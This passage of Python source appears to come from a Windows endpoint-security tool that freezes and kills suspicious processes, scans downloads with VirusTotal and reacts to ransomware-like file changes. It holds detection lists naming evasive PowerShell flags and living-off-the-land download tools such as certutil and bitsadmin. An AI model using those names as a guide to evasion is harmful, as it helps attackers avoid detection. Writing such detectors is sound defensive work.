            
            self.logger.critical(
                f"Blocked malicious process {process_info['name']} (PID: {pid}) - " 
                f"Reason: {analysis_result.get('detected_patterns', 'High risk activity')}"
            )
        except psutil.NoSuchProcess:
            self.logger.info(f"Process {pid} already terminated")
        except Exception as e:
            self.logger.error(f"Blocking failed: {e}")
            
    def _collect_forensic_data(self, pid, analysis_result):
        """Collect forensic evidence before termination"""
        try:
            proc = psutil.Process(pid)
            return {
                'timestamp': datetime.now().isoformat(),
                'process': {
                    'name': proc.name(),
                    'pid': pid,
                    'ppid': proc.ppid(),
                    'cmdline': proc.cmdline(),
                    'create_time': proc.create_time()
                },
                'connections': [{
                    'fd': conn.fd,
                    'family': conn.family,
                    'type': conn.type,
                    'laddr': f"{conn.laddr[0]}:{conn.laddr[1]}" if conn.laddr else None,
                    'raddr': f"{conn.raddr[0]}:{conn.raddr[1]}" if conn.raddr else None,
                    'status': conn.status
                } for conn in proc.net_connections()],
                'open_files': [f.path for f in proc.open_files()],
                'threads': len(proc.threads()),
                'analysis_result': analysis_result
            }
        except Exception:
            return {'error': 'Failed to collect forensic data'}
    def _sync_freeze_process(self, pid):
        """Synchronous process freezing using debug API"""
        if not psutil.pid_exists(pid):
            return True
        if kernel32.DebugActiveProcess(pid):
            self.logger.info(f"Froze process {pid}")
            return True
        else:
            error = ctypes.GetLastError()
            self.logger.error(f"Failed to freeze process {pid}: error {error}")
            return False    
    async def _freeze_process(self, pid):
        """Freeze process using debug API"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            self.io_thread_pool,
            self._sync_freeze_process,
            pid
        )   
    async def _unfreeze_process(self, pid):
        """Unfreeze process by detaching debugger"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            self.io_thread_pool,
            self._sync_unfreeze_process,
            pid
        ) 
    def _sync_unfreeze_process(self, pid):
        if not psutil.pid_exists(pid):
            return True
        if kernel32.DebugActiveProcessStop(pid):
            self.logger.info(f"Unfrozen process {pid}")
            return True
        else:
            error = ctypes.GetLastError()
            self.logger.error(f"Failed to unfreeze process {pid}: error {error}")
            return False
            
    def _terminate_process_tree(self, pid):
        """Terminate entire process tree safely"""
        try:
            parent = psutil.Process(pid)
            for child in parent.children(recursive=True):
                try:
                    child.kill()
                except psutil.NoSuchProcess:
                    pass
                except psutil.AccessDenied:
                    self.logger.error(f"Access denied when killing child process {child.pid}")
            # Check for critical processes before killing parent
            CRITICAL_PROCS = {
                "lsass.exe", "csrss.exe", "wininit.exe", "smss.exe", 
                "services.exe", "system", "svchost.exe"
            }
            if parent.name().lower() in CRITICAL_PROCS or pid == os.getpid():
                self.logger.critical(f"Refusing to kill critical or self process: {parent.name()} (PID: {pid})")
                return
            try:
                parent.kill()
            except psutil.NoSuchProcess:
                pass
            except psutil.AccessDenied:
                self.logger.error(f"Access denied when killing parent process {pid}")
        except psutil.NoSuchProcess:
            pass
        except Exception as e:
            self.logger.error(f"Error terminating process tree for PID {pid}: {e}")

    def _add_to_blocklist(self, process_name, cmdline):
        """Add process signature to runtime blocklist"""
        signature = {
            'name': process_name.lower(),
            'cmdline_patterns': self._extract_suspicious_patterns(cmdline),
            'timestamp': time.time()
        }
        self.runtime_blocklist.append(signature)
        self.logger.info(f"Added to blocklist: {signature}")

    def _extract_suspicious_patterns(self, cmdline):
        """Extract unique patterns from command line"""
        patterns = []
        cmd_lower = cmdline.lower() if cmdline else ''
        
        # Check for encoded commands
        if re.search(r'[A-Za-z0-9+/]{30,}={0,2}', cmd_lower):
            patterns.append('base64_encoded')
            
        # Check for suspicious parameters
        suspicious_params = [
            '-encodedcommand', '-windowstyle hidden', 
            '-executionpolicy bypass', '/c', '/s', '/q'
        ]
        patterns.extend(p for p in suspicious_params if p in cmd_lower)
        
        # Check for LOLBins
        lolbins = self.volt_detector.get_extended_lolbins()
        patterns.extend(bin for bin in lolbins if bin in cmd_lower)
        
        return list(set(patterns))  # Deduplicate
            
    async def _enhanced_monitoring(self, pid):
        """Enhanced monitoring for suspicious processes"""
        try:
            proc = psutil.Process(pid)
            for _ in range(60):  # Monitor for 5 minutes (5s intervals)
                if not proc.is_running():
                    break
                await asyncio.sleep(5)
        except psutil.NoSuchProcess:
            pass
        except Exception as e:
            self.logger.error(f"Monitoring error: {e}")

    async def _create_emergency_snapshot(self):
        """Create emergency snapshot on available VM"""
        vm_locks = getattr(self, '_vm_locks', {})
        
        # Get VM list from vm_manager
        vm_names = getattr(self.vm_manager, 'vm_names', ['Sandbox_ece20ce9', 'Sandbox_3bca83be', 'Sandbox_6367daa7'])
        
        for vm_name in vm_names:
            if vm_name not in vm_locks:
                vm_locks[vm_name] = asyncio.Lock()
            
            # Try to acquire lock with timeout
            try:
                async with asyncio.timeout(5):  # 5 second timeout
                    async with vm_locks[vm_name]:
                        self.logger.info(f"Attempting emergency snapshot on VM: {vm_name}")
                        
                        # Add delay to prevent rapid retries
                        await asyncio.sleep(2)
                        
                        try:
                            # Start VM
                            start_cmd = f'VBoxManage startvm "{vm_name}" --type headless'
                            result = await asyncio.create_subprocess_exec(
                                *start_cmd.split(), 
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.PIPE
                            )
                            await result.communicate()
                            
                            if result.returncode == 0:
                                # Wait for VM to be ready
                                await asyncio.sleep(10)
                                
                                # Create snapshot
                                snapshot_name = f"EmergencySnapshot_{int(time.time())}"
                                snapshot_cmd = f'VBoxManage snapshot "{vm_name}" take "{snapshot_name}" --description "Emergency snapshot"'
                                
                                result = await asyncio.create_subprocess_exec(
                                    *snapshot_cmd.split(),
                                    stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.PIPE
                                )
                                stdout, stderr = await result.communicate()
                                
                                if result.returncode == 0:
                                    self.logger.info(f"Emergency snapshot created successfully on VM: {vm_name}")
                                    self.logger.info("Emergency system snapshot created")
                                    return True
                                else:
                                    self.logger.warning(f"Failed to create snapshot on VM: {vm_name}, trying next VM")
                            else:
                                self.logger.warning(f"Failed to start VM: {vm_name}, trying next VM")
                                
                        except asyncio.TimeoutError:
                            self.logger.warning(f"Timeout while creating snapshot on VM: {vm_name}")
                        except Exception as e:
                            self.logger.warning(f"Failed to create snapshot on VM: {vm_name}: {e}")
                            
            except asyncio.TimeoutError:
                self.logger.warning(f"Could not acquire lock for VM: {vm_name}")
                continue
                
        self.logger.error("All VM snapshot attempts failed")
        return False
    def _log_decision(self, decision_data):
        """Log decision data to CSV"""
        try:
            with open('decision_log.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    decision_data['timestamp'],
                    decision_data['process'],
                    decision_data['pid'],
                    decision_data['risk_score'],
                    decision_data['decision']
                ])
        except Exception as e:
            self.logger.error(f"Logging failed: {e}")
    
    def enable_web_protection(self):
        """Enable comprehensive web protection"""
        self.web_protection_enabled = True
        self.scan_all_websites = True
        self.scan_all_downloads = True
        self.logger.info("🌐 Web protection enabled - all websites and downloads will be scanned")
    
    def disable_web_protection(self):
        """Disable web protection"""
        self.web_protection_enabled = False
        self.scan_all_websites = False
        self.scan_all_downloads = False
        self.logger.info("🌐 Web protection disabled")
    
    def configure_web_protection(self, config):
        """Configure web protection settings"""
        if 'scan_all_websites' in config:
            self.scan_all_websites = config['scan_all_websites']
        if 'scan_all_downloads' in config:
            self.scan_all_downloads = config['scan_all_downloads']
        if 'min_virustotal_ratio' in config:
            self.min_virustotal_ratio = config['min_virustotal_ratio']
        if 'download_extensions' in config:
            self.download_extensions = set(config['download_extensions'])
        
        self.logger.info(f"🌐 Web protection configured: websites={self.scan_all_websites}, downloads={self.scan_all_downloads}")
    
    def get_web_protection_stats(self):
        """Get web protection statistics"""
        return {
            'enabled': self.web_protection_enabled,
            'scan_all_websites': self.scan_all_websites,
            'scan_all_downloads': self.scan_all_downloads,
            'blocked_domains_count': len(self.blocked_domains),
            'scanned_urls_count': len(self.scanned_urls),
            'scanned_files_count': len(self.scanned_files),
            'statistics': self.web_protection_stats.copy()
        }
    
    def clear_web_protection_cache(self):
        """Clear web protection cache"""
        self.scanned_urls.clear()
        self.scanned_files.clear()
        self.logger.info("🧹 Web protection cache cleared")
    
    def unblock_domain(self, domain):
        """Unblock a previously blocked domain"""
        if domain in self.blocked_domains:
            self.blocked_domains.remove(domain)
            self.logger.info(f" Unblocked domain: {domain}")
        else:
            self.logger.warning(f"Domain {domain} was not blocked")
    
    def get_blocked_domains(self):
        """Get list of blocked domains"""
        return list(self.blocked_domains)
    
    def enable_download_protection(self):
        """Enable focused download protection"""
        self.web_protection_enabled = True
        self.logger.info("🛡️ Download protection enabled - monitoring browsers and shells for malicious downloads")
    
    def disable_download_protection(self):
        """Disable download protection"""
        self.web_protection_enabled = False
        self.logger.info("🛡️ Download protection disabled")
    
    def get_download_protection_stats(self):
        """Get download protection statistics"""
        return {
            'enabled': self.web_protection_enabled,
            'blocked_domains_count': len(self.blocked_domains),
            'blocked_ips_count': len(self.blocked_ips),
            'scanned_urls_count': len(self.scanned_urls),
            'pre_download_checks': len([url for url, data in self.scanned_urls.items() if data.get('malicious')]),
            'monitored_processes': [
                'chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe', 
                'opera.exe', 'brave.exe', 'safari.exe',
                'curl.exe', 'wget.exe', 'powershell.exe', 'bitsadmin.exe', 
                'certutil.exe', 'certreq.exe'
            ]
        }
    
    def enable_pre_download_protection(self):
        """Enable pre-download protection - checks URLs before download starts"""
        self.web_protection_enabled = True
        self.logger.info("🛡️ PRE-DOWNLOAD PROTECTION ENABLED")
        self.logger.info("   URLs will be checked BEFORE download starts")
        self.logger.info("   Only non-malicious downloads will be allowed")
        self.logger.info("   Malicious downloads will be blocked before they start")
    
    def disable_pre_download_protection(self):
        """Disable pre-download protection"""
        self.web_protection_enabled = False
        self.logger.info("🛡️ PRE-DOWNLOAD PROTECTION DISABLED")
    
    def get_pre_download_protection_status(self):
        """Get pre-download protection status and statistics"""
        return {
            'enabled': self.web_protection_enabled,
            'protection_mode': 'PRE_DOWNLOAD_CHECK',
            'description': 'Checks URLs with VirusTotal before download starts',
            'blocked_domains': list(self.blocked_domains),
            'blocked_ips': list(self.blocked_ips),
            'scanned_urls_count': len(self.scanned_urls),
            'malicious_urls_blocked': len([url for url, data in self.scanned_urls.items() if data.get('malicious')]),
            'safe_downloads_allowed': len([url for url, data in self.scanned_urls.items() if not data.get('malicious')])
        }
    
    async def scan_existing_downloads(self):
        """Scan existing files in download folders for malicious content"""
        self.logger.info("🔍 Scanning existing downloads for malicious content...")
        
        download_folders = self.download_monitor.download_folders
        scanned_count = 0
        malicious_count = 0
        
        for folder in download_folders:
            if not os.path.exists(folder):
                continue
                
            try:
                for file_path in pathlib.Path(folder).rglob('*'):
                    if file_path.is_file():
                        file_ext = file_path.suffix.lower()
                        
                        # Check if it's a monitored file type
                        if file_ext in self.download_extensions:
                            scanned_count += 1
                            
                            # Check if file is recent (within last 24 hours)
                            file_age = time.time() - file_path.stat().st_mtime
                            if file_age < 86400:  # 24 hours
                                self.logger.info(f"Scanning existing file: {file_path.name}")
                                
                                # Scan the file (simplified - just log for now)
                                self.logger.info(f"Found existing file: {file_path}")
                                is_safe = True  # Allow existing files for now
                                
                                if not is_safe:
                                    malicious_count += 1
                                    
            except Exception as e:
                self.logger.error(f"Error scanning folder {folder}: {e}")
                
        self.logger.info(f" Existing download scan complete: {scanned_count} files scanned, {malicious_count} malicious files found")
        return scanned_count, malicious_count

    async def _backup_lolbin_detection(self):
        """Backup LOLBin detection - scans for any LOLBins that might have been missed"""
        while self.monitoring_active:
            try:
                # Get all running processes
                all_processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'create_time']):
                    try:
                        proc_info = proc.info
                        # Only check processes created in the last 5 seconds
                        if time.time() - proc_info['create_time'] < 5.0:
                            all_processes.append({
                                'pid': proc_info['pid'],
                                'name': proc_info['name'],
                                'cmdline': ' '.join(proc_info['cmdline']) if proc_info['cmdline'] else '',
                                'create_time': proc_info['create_time']
                            })
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                # Check each process for LOLBins
                all_lolbins = self.volt_detector.get_extended_lolbins()
                for process_info in all_processes:
                    process_name = process_info['name'].lower()
                    
                    # Check if this is a LOLBin
                    if process_name in [lolbin.lower() for lolbin in all_lolbins]:
                        # Check if we already processed this process
                        if not self._is_process_already_analyzed(process_info):
                            self.logger.warning(f"🔍 BACKUP DETECTION: Found LOLBin {process_name} (PID: {process_info['pid']}) - Processing now")
                            await self._handle_intercepted_process(process_info)
                
                # Run backup detection every 500ms for faster response
                await asyncio.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"Backup LOLBin detection error: {e}")
                await asyncio.sleep(5)
    
    def _is_process_already_analyzed(self, process_info):
        """Check if a process has already been analyzed (simple cache check)"""
        # Simple cache key based on PID and creation time
        cache_key = f"{process_info['pid']}_{process_info['create_time']}"
        
        if not hasattr(self, '_analyzed_processes'):
            self._analyzed_processes = set()
        
        if cache_key in self._analyzed_processes:
            return True
        
        # Add to cache and limit size
        self._analyzed_processes.add(cache_key)
        if len(self._analyzed_processes) > 1000:
            # Remove oldest entries
            self._analyzed_processes.clear()
        
        return False

    async def _check_multiple_urls_parallel(self, urls):
        """Check multiple URLs in parallel using multiprocessing"""
        if not urls:
            return {}
        
        # Create tasks for parallel processing
        tasks = []
        for url in urls:
            task = asyncio.create_task(self._check_url_with_virustotal(url))
            tasks.append(task)
        
        # Wait for all checks to complete
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Create result dictionary
        url_results = {}
        for url, result in zip(urls, results):
            if isinstance(result, Exception):
                url_results[url] = False  # Allow on error
            else:
                url_results[url] = result
        
        return url_results
    
    def get_multiprocessing_stats(self):
        """Get multiprocessing statistics"""
        return {
            'cpu_thread_pool_size': getattr(self.cpu_thread_pool, '_max_workers', 'unknown'),
            'io_thread_pool_size': getattr(self.io_thread_pool, '_max_workers', 'unknown'),
            'cpu_process_pool_size': getattr(self.cpu_process_pool, '_max_workers', 'unknown'),
            'active_tasks_count': len(self.active_tasks),
            'parallel_processing': True
        }

class EnhancedDownloadMonitor(FileSystemEventHandler):
    """Enhanced download monitoring with file system watching"""
    
    def __init__(self, security_gateway):
        self.security_gateway = security_gateway
        self.download_folders = self._get_download_folders()
        self.observer = Observer()
        self.monitoring_active = False
        self.recent_downloads = {}  # Track recent downloads by process
        self.download_timeout = 300  # 5 minutes to detect downloads
        
    def _get_download_folders(self):
        """Get common download folders"""
        folders = []
        
        # User's Downloads folder
        user_downloads = os.path.expanduser("~/Downloads")
        if os.path.exists(user_downloads):
            folders.append(user_downloads)
            
        # System Downloads folder
        system_downloads = "C:\\Users\\Public\\Downloads"
        if os.path.exists(system_downloads):
            folders.append(system_downloads)
            
        # Browser-specific download folders
        browser_downloads = [
            os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Downloads"),
            os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data/Default/Downloads"),
            os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles/*/Downloads")
        ]
        
        for folder in browser_downloads:
            if '*' in folder:
                # Handle wildcard paths
                matches = glob.glob(folder)
                folders.extend(matches)
            elif os.path.exists(folder):
                folders.append(folder)
                
        return folders
    
    def start_monitoring(self):
        """Start file system monitoring"""
        if self.monitoring_active:
            return
            
        self.monitoring_active = True
        
        # Schedule observer for each download folder
        for folder in self.download_folders:
            try:
                self.observer.schedule(self, folder, recursive=False)
                self.security_gateway.logger.info(f"Monitoring downloads in: {folder}")
            except Exception as e:
                self.security_gateway.logger.error(f"Failed to monitor {folder}: {e}")
        
        # Start the observer in a separate thread
        self.observer.start()
        
        # Start background cleanup task
        threading.Thread(target=self._cleanup_old_downloads, daemon=True).start()
        
    def stop_monitoring(self):
        """Stop file system monitoring"""
        if not self.monitoring_active:
            return
            
        self.monitoring_active = False
        self.observer.stop()
        self.observer.join()
        
    def on_created(self, event):
        """Handle file creation events"""
        if event.is_directory:
            return
            
        file_path = str(event.src_path)  # Convert to string to avoid bytes issue
        file_ext = pathlib.Path(file_path).suffix.lower()
        
        # Check if it's a monitored file type
        if file_ext in self.security_gateway.download_extensions:
            self._handle_new_download(file_path)
            
    def on_moved(self, event):
        """Handle file move events (downloads often create temp files then move them)"""
        if event.is_directory:
            return
            
        dest_path = str(event.dest_path)  # Convert to string to avoid bytes issue
        file_ext = pathlib.Path(dest_path).suffix.lower()
        
        # Check if it's a monitored file type
        if file_ext in self.security_gateway.download_extensions:
            self._handle_new_download(dest_path)
            
    def _handle_new_download(self, file_path):
        """Handle a newly downloaded file"""
        try:
            # Get the process that likely created this file
            creating_process = self._find_creating_process(file_path)
            
            if creating_process:
                process_name = creating_process.name().lower()
                
                # Check if it's a download agent
                if process_name in self.security_gateway.download_agents:
                    self.security_gateway.logger.info(f"Detected download: {os.path.basename(file_path)} by {process_name}")
                    # Schedule file scanning using thread-safe approach
                    self._schedule_async_scan(file_path, creating_process)
                else:
                    # Still scan suspicious files from any process
                    if self._is_suspicious_file(file_path):
                        self.security_gateway.logger.warning(f"Suspicious file created: {os.path.basename(file_path)} by {process_name}")
                        self._schedule_async_scan(file_path, creating_process)
                        
        except Exception as e:
            self.security_gateway.logger.error(f"Error handling new download {file_path}: {e}")
            
    def _find_creating_process(self, file_path):
        """Find the process that likely created the file"""
        try:
            # Get file creation time
            file_stat = os.stat(file_path)
            creation_time = file_stat.st_ctime
            
            # Look for processes that were active around the creation time
            for proc in psutil.process_iter(['pid', 'name', 'create_time']):
                try:
                    # Check if process was active when file was created
                    if abs(proc.create_time() - creation_time) < 10:  # Within 10 seconds
                        return proc
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
            return None
        except Exception:
            return None
            
    def _is_suspicious_file(self, file_path):
        """Check if a file is suspicious based on name/extension"""
        filename = os.path.basename(file_path).lower()
        
        # Suspicious patterns
        suspicious_patterns = [
            r'\.(exe|dll|msi|ps1|bat|js|vbs|jar|scr|pif)$',
            r'(malware|virus|trojan|backdoor|keylogger|spyware)',
            r'(crack|hack|keygen|serial|patch)',
            r'(download|setup|install)',
            r'\.(zip|rar|7z|tar|gz)$'  # Archive files
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, filename):
                return True
                
        return False
        
    def _schedule_async_scan(self, file_path, creating_process):
        """Schedule async scan in a thread-safe way"""
        try:
            # Use the security gateway's event loop to schedule the task
            if hasattr(self.security_gateway, 'loop') and self.security_gateway.loop:
                # Schedule the coroutine in the main event loop
                future = asyncio.run_coroutine_threadsafe(
                    self._scan_download_async(file_path, creating_process),
                    self.security_gateway.loop
                )
                # Optional: handle the future result
                future.add_done_callback(lambda f: self._handle_scan_result(f, file_path))
            else:
                # Fallback: run in a new event loop
                threading.Thread(
                    target=self._run_scan_in_new_loop,
                    args=(file_path, creating_process),
                    daemon=True
                ).start()
        except Exception as e:
            self.security_gateway.logger.error(f"Error scheduling scan for {file_path}: {e}")
            
    def _run_scan_in_new_loop(self, file_path, creating_process):
        """Run scan in a new event loop (fallback method)"""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._scan_download_async(file_path, creating_process))
        except Exception as e:
            self.security_gateway.logger.error(f"Error in new loop scan for {file_path}: {e}")
        finally:
            loop.close()
            
    def _handle_scan_result(self, future, file_path):
        """Handle the result of the async scan"""
        try:
            result = future.result()
            # Handle scan result if needed
        except Exception as e:
            self.security_gateway.logger.error(f"Error in scan result for {file_path}: {e}")
    
    async def _scan_download_async(self, file_path, creating_process):
        """Scan a downloaded file asynchronously with VirusTotal"""
        try:
            # Wait a moment for file to be fully written
            await asyncio.sleep(2)
            
            # Check if file still exists
            if not os.path.exists(file_path):
                return
                
            # Get source URL from process connections
            source_url = await self._get_source_url_from_process(creating_process)
            
            # Log the download detection
            self.security_gateway.logger.info(f"Found downloaded file: {file_path}")
            
            # Actually scan the file with VirusTotal
            if hasattr(self.security_gateway, '_check_download_with_virustotal'):
                is_safe = await self.security_gateway._check_download_with_virustotal(file_path)
                
                if not is_safe:
                    self.security_gateway.logger.critical(f"VIRUSTOTAL ALERT: Malicious file detected: {file_path}")
                    self.security_gateway.logger.critical(f"Source: {source_url}")
                    
                    # Delete the malicious file
                    try:
                        os.remove(file_path)
                        self.security_gateway.logger.info(f"Deleted malicious file: {file_path}")
                    except Exception as e:
                        self.security_gateway.logger.error(f"Failed to delete malicious file {file_path}: {e}")
                    
                    # Block the creating process
                    if creating_process:
                        await self.security_gateway._block_process({
                            'pid': creating_process.pid,
                            'name': creating_process.name(),
                            'cmdline': ' '.join(creating_process.cmdline())
                        }, {'reason': 'malicious_file_download'})
                else:
                    self.security_gateway.logger.info(f"File scan completed - file is safe: {file_path}")
            else:
                self.security_gateway.logger.warning(f"VirusTotal scanning not available for: {file_path}")
            
        except Exception as e:
            self.security_gateway.logger.error(f"Error scanning download {file_path}: {e}")
            
    async def _get_source_url_from_process(self, proc):
        """Get the source URL from process network connections"""
        try:
            connections = proc.net_connections()
            for conn in connections:
                if conn.status == 'ESTABLISHED' and conn.raddr:
                    ip, port = conn.raddr
                    if port in (80, 443, 8080, 8443):
                        domain = await self.security_gateway._resolve_ip_to_domain_cached(ip)
                        if domain:
                            protocol = 'https' if port in (443, 8443) else 'http'
                            return f"{protocol}://{domain}"
            return "unknown"
        except Exception:
            return "unknown"
            
    def _cleanup_old_downloads(self):
        """Clean up old download tracking data"""
        while self.monitoring_active:
            try:
                current_time = time.time()
                to_remove = []
                
                for file_path, timestamp in self.recent_downloads.items():
                    if current_time - timestamp > self.download_timeout:
                        to_remove.append(file_path)
                        
                for file_path in to_remove:
                    del self.recent_downloads[file_path]
                    
                time.sleep(60)  # Clean up every minute
            except Exception as e:
                self.security_gateway.logger.error(f"Error in download cleanup: {e}")
                time.sleep(60)

class FileGuard:
    def __init__(self, protected_extensions=None):
        self.protected_extensions = protected_extensions or {
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.png', '.sql', '.mdb', '.psd', '.dwg'
        }
        self.suspicious_operations = 0
        self.lock = threading.Lock()
        
    def monitor_file_changes(self):
        """Monitor file system for mass modifications"""
        original_files = self._get_protected_files()
        
        while True:
            time.sleep(5)  # Check every 5 seconds
            current_files = self._get_protected_files()
            
            # Check for mass renames/encryptions
            changed = len(original_files - current_files)
            if changed > 10:  # More than 10 files changed
                with self.lock:
                    self.suspicious_operations += changed
                    
                if self.suspicious_operations > 50:
                    self.trigger_lockdown()
                    
            original_files = current_files
            
    def _get_protected_files(self):
        """Get set of all protected files on the system"""
        protected = set()
        for root, _, files in os.walk('C:\\'):
            for file in files:
                if any(file.lower().endswith(ext) for ext in self.protected_extensions):
                    protected.add(os.path.join(root, file))
        return protected
        
    def trigger_lockdown(self):
        """Emergency response to potential ransomware"""
        logging.critical("RANSOMWARE DETECTED! Initiating system lockdown.")
        
        # 1. Kill suspicious processes
        for proc in psutil.process_iter():
            try:
                if proc.name().lower() in ['cmd.exe', 'powershell.exe', 'wscript.exe']:
                    proc.kill()
            except Exception:
                pass
                
        # 2. Disable network
        os.system('netsh interface set interface "Ethernet" admin=disable')
        
        # 3. Alert administrator
        # Implement your alerting mechanism here
        
        # 4. Create emergency restore point
        os.system('powershell -command "Checkpoint-Computer -Description \"RansomwareEmergency\" -RestorePointType \"MODIFY_SETTINGS\""')
if __name__ == "__main__":
    asyncio.run(SecurityGateway().start_protection())
    
    